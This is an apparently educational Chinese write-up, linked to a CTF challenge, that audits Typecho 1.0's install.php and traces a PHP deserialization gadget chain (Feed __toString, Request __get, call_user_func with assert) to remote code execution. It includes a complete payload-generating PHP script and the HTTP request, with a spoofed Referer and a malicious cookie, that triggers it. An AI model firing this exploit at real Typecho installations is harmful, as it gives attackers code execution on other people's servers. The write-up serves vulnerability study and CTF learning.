<!-- CMS 代码审计与利用 1 -->
<!-- Typecho 1.0 的 BUG -->
# CMS 代码审计与利用 1 | Typecho 1.0 的 BUG

https://ctf.mukeran.cn/web/notes/5

前言
====
CMS 漏洞的发现和利用是实战中常见的问题。Typecho 1.0 中有一个漏洞利用的思想。利用已有类的方法(特别是魔术方法)来执行任意代码。

知识补充 - PHP 的魔法方法
====
PHP 里面有一些魔术方法(类似 Python)，当特定情况下会被调用，魔术方法以双下划线开头，常用的如下：  

|方法名|调用事件|
|-----|-------|
|\_\_wakeup|`unserialize()` 时|
|\_\_sleep|`serialize()` 时|
|\_\_destruct|对象被销毁时|
|\_\_call|访问对象中不可访问的方法时|
|\_\_callStatic|访问类中不可访问的静态方法时|
|\_\_get|获取不可访问的属性时|
|\_\_set|更改不可访问的属性时|
|\_\_isset|调用 `isset()` 或 `empty()` 的参数为不可访问的属性时|
|\_\_unset|调用 `unset()` 的参数为不可访问的属性时|
|\_\_toString|对象需要转化为字符串时|
|\_\_invoke|对象被当做函数调用时|

\_\_construct 也是非常常见的魔术方法，但是我们在很多情况下无法利用，所以不再上面列出。

漏洞发现
====
一般漏洞的利用需要耐心地去寻找，特别关注那些用户可以改变的量，或者说 Cookie 中开发者一般认为用户无法改变的量，实际上却可以被我们改变的量。  
在 Typecho 1.0 的 `install.php` 中有这样一段代码：
```php
<?php if (isset($_GET['finish'])) : ?>
    <?php if (!@file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php')) : ?>
    ...
    <?php elseif (!Typecho_Cookie::get('__typecho_config')): ?>
    ...
    <?php else : ?>
    <?php
    $config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
    Typecho_Cookie::delete('__typecho_config');
    $db = new Typecho_Db($config['adapter'], $config['prefix']);
    $db->addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);
    Typecho_Db::set($db);
    ?>
    ...
<?php endif; ?>
```
看到代码中有 `Typecho_Cookie::get('__typecho_config')`，`Typecho_Cookie` 是程序定义的读取 Cookie 的类，这就是我们利用的入口，其地位与 `$_GET`, `$_POST`, `$_COOKIE` 等相同。  
接下来，看到有一个 `unserialize`。这是我们利用的关键。我们知道 PHP 的序列与反序列化可以让一个对象和格式字符串进行转换。而 PHP 是动态语言，执行代码时没有强制要求变量的类型。类似 `$obj->method()` 的执行，无论 `$obj` 是什么类型，只要有 `method` 这个方法就成功执行。  
那么我们就可以利用这一个特性来构造一个类，让这个类最终可以执行任意代码。这个类的最后执行的函数里面一定要有 `call_user_func`, `array_map` 或其它类似的可以执行其他代码的代码。  
但在分析之前，我们先看看我们**是否能成功执行**这一段代码。  
Typecho 1.0 正常安装后会在根目录生成 `config.inc.php` 这一个文件，且 `install.php` 不会被删除。故只要能执行到这个 if，并传入 GET 参数 finish，就能执行 else 这一段代码。再看看 `install.php` 的开头部分。有这样一段代码：  
```php
//判断是否已经安装
if (!isset($_GET['finish']) && file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') && empty($_SESSION['typecho'])) {
    exit;
}

// 挡掉可能的跨站请求
if (!empty($_GET) || !empty($_POST)) {
    if (empty($_SERVER['HTTP_REFERER'])) {
        exit;
    }

    $parts = parse_url($_SERVER['HTTP_REFERER']);
	if (!empty($parts['port']) && $parts['port'] != 80 && !Typecho_Common::isAppEngine()) {
        $parts['host'] = "{$parts['host']}:{$parts['port']}";
    }

    if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) {
        exit;
    }
}
```
首先肯定是已经安装了 Typecho 了，然后下面挡掉可能的跨站请求中，我们可以看见其实就是判定 header 里面的 `Refered` 是不是本站，这个我们发 header 的时候令 Refered 为本站 URL 即可。  
**下面开始构造的分析**：  
在构造前，首先需要知晓上面关于魔法函数的知识。虽然说 `unserialize` 可以将格式字符串转化为对象，但是这些对象的类型必须是当前上下文已经定义了的类型，不然就无法转化。那么我们就要在上下文中找到突破口。  
我们在代码中看到这一句：  
```php
$db = new Typecho_Db($config['adapter'], $config['prefix']);
```
这一句里面用到了 `$config`，且我们可以判定 config 是一个 `array`，并且会用到它的 `adapter` 和 `prefix`。  
查看一下这个 `Typecho_Db` 的构造函数 `__construct`：  
```php
public function __construct($adapterName, $prefix = 'typecho_')
{
    /** 获取适配器名称 */
    $this->_adapterName = $adapterName;

    /** 数据库适配器 */
    $adapterName = 'Typecho_Db_Adapter_' . $adapterName;

    if (!call_user_func(array($adapterName, 'isAvailable'))) {
        throw new Typecho_Db_Exception("Adapter {$adapterName} is not available");
    }

    $this->_prefix = $prefix;

    /** 初始化内部变量 */
    $this->_pool = array();
    $this->_connectedPool = array();
    $this->_config = array();

    //实例化适配器对象
    $this->_adapter = new $adapterName();
}
```
这里有两个利用点：  
```php
$adapterName = 'Typecho_Db_Adapter_' . $adapterName;
$this->_adapter = new $adapterName();
```
如果我们让这两句中的 `$adapterName` 不是字符串，那么它们分别会执行 `__toString` 和 `__invoke` 方法。我们这里以 `__toString` 作为跟踪。  
因为我们在 `serialize` 时可以使其成为任意的已有的类，那么我们就寻找一个声明了 `__toString` 的类。`install.php` 前面 `require` 了一些 php 文件，其中 `common.php` 里面定义了 `__autoload` 并且进行了注册，所以我们想要的类程序会自动帮我们 `include`。  
最终在 `Feed.php` 里面找到了可以利用的方法：  
```php
public function __toString()
{
    $result = '<?xml version="1.0" encoding="' . $this->_charset . '"?>' . self::EOL;

    if (self::RSS1 == $this->_type) {
        ...
    } else if (self::RSS2 == $this->_type) {
        ...
        foreach ($this->_items as $item) {
            $content .= '<item>' . self::EOL;
            $content .= '<title>' . htmlspecialchars($item['title']) . '</title>' . self::EOL;
            $content .= '<link>' . $item['link'] . '</link>' . self::EOL;
            $content .= '<guid>' . $item['link'] . '</guid>' . self::EOL;
            $content .= '<pubDate>' . $this->dateFormat($item['date']) . '</pubDate>' . self::EOL;
            $content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;
            ...
        }
        ...
    }
    ...
}
```
看到代码中有一句 `$item['author']->screenName`，这个时候如果 `$item['author']` 没有 `screenName` 属性的话，就会调用 `__get` 方法。我们再寻找含有 `__get` 方法的类。在 `Request.php` 里面找到可以利用的方法：  
```php
public function __get($key)
{
    return $this->get($key);
}

public function get($key, $default = NULL)
{
    switch (true) {
        case isset($this->_params[$key]):
            $value = $this->_params[$key];
            break;
        case isset(self::$_httpParams[$key]):
            $value = self::$_httpParams[$key];
            break;
        default:
            $value = $default;
            break;
    }

    $value = !is_array($value) && strlen($value) > 0 ? $value : $default;
    return $this->_applyFilter($value);
}
```
此时 `__get` 方法里面的 `$key` 为 `screenName`。再看看这个 `_applyFilter`：  
```php
private function _applyFilter($value)
{
    if ($this->_filter) {
        foreach ($this->_filter as $filter) {
            $value = is_array($value) ? array_map($filter, $value) :
            call_user_func($filter, $value);
        }

        $this->_filter = array();
    }

    return $value;
}
```
发现 `call_user_func`！这个很有可能可以利用，我们仔细分析一下。  
在上面 `get` 方法中，如果我们设置属性 `_params` 为 `array`，且 `{ 'screenName' => <value> }`，那么 `$value` 就会被赋值为 `value`。  
在 `_applyFilter` 方法中，如果我们设置属性 `_filter` 为 `array` 且设置一个值为 `assert`，让 `value` 为我们想要执行的函数，那么我们想要执行的函数就被执行了！所以我们就可以执行任意代码。  

对象构造
====
我们把需要的类和方法写到一个 PHP 文件中来：  
```php
class Typecho_Feed
{
    private $_type;
    private $_items;
    function __construct($type, $items) {
        $this->_type = $type;
        $this->_items = $items;
    }
}
class Typecho_Request
{
    private $_params;
    private $_filter;
    function __construct($params, $filter) {
        $this->_params = $params;
        $this->_filter = $filter;
    }
}
$config = array(
    'adapter' => new Typecho_Feed(
        'RSS 2.0', //_type
        array( //_items
            array(
                'author' => new Typecho_Request(
                    array('screenName' => 'phpinfo()'), //_params
                    array('assert')                     //_filter
                ),
                'category' => array(
                    new stdClass() //important!
                )
            )
        )
    )
);
echo(base64_encode(serialize($config)));
```
写这个代码的时候最好放在本地进行调试，因为很多时候并不能一次写好(比如我调了很久)。  
特别注意，`_filter` 里面设置的函数不能为 `eval`，因为 `eval` 不是函数，为语言构造器。  
上面有一个注意的地方，可以发现，我设置了一个 `category`，而且还是一个类。如果删掉这一个，你会发现无法执行我们想要的代码了，原因是 `Db.php` 中有这样一个 if(完整代码见上面)：  
```php
if (!call_user_func(array($adapterName, 'isAvailable'))) {
    throw new Typecho_Db_Exception("Adapter {$adapterName} is not available");
}
```
由于我们的骚操作，`$adapterName` 变成了很长的一串 XML，这时候 `call_user_func` 肯定是无法执行的，所以就被 `throw` 异常了。而 Typecho 1.0 抛出异常就不显示之前输出的内容了(应该是可以设置的，只不过这里不需要了解)。所以我们要把这个错误避免掉，我们看到在我们利用的 `Feed.php` foreach 中有一个 if：  
```php
if (!empty($item['category']) && is_array($item['category'])) {
    foreach ($item['category'] as $category) {
        $content .= '<category><![CDATA[' . $category['name'] . ']]></category>' . self::EOL;
    }
}
```
如果 `$category['name']` 不存在，那么其实是 PHP 自己抛出了一个异常，但是没有被 `Typecho_Exception` 管理，后面的程序不运行了，故没有被 `throw` 影响。  
我们得到了 `__typecho_config` 的值，我们可以把上面 `screenName` 改成我们想要执行的函数来执行。  

执行漏洞
====
```http
GET /install.php?finish HTTP/1.1
...
Refered: {Host}/install.php
Cookie: __typecho_config={base64}
...
```
最后页面返回执行结果。

总结
====
这个漏洞的挖掘给了我一个思路去想如何挖掘其他程序的漏洞。真正要从零发现一个漏洞是非常困难的，我是站在巨人的肩膀上去复现。  
这个漏洞给我们带来反思：设计程序时要注意数据入口的审计。可能不知不觉中就会带来一堆 BUG，并且被利用。  
遇到这种问题，因为依赖 `call_user_func` 之类的函数，魔术方法及数据入口，我们可以先搜索这些关键词，看是否可能存在问题。  
`unserialize` 对这类问题也是关键，也要注意。

相关题目
====
[小明的博客 - Bugku](http://ctf.bugku.com/challenges#%E5%B0%8F%E6%98%8E%E7%9A%84%E5%8D%9A%E5%AE%A2 "前往Bugku") | [我的 WriteUp](https://ctf.mukeran.cn/web/writeups/4)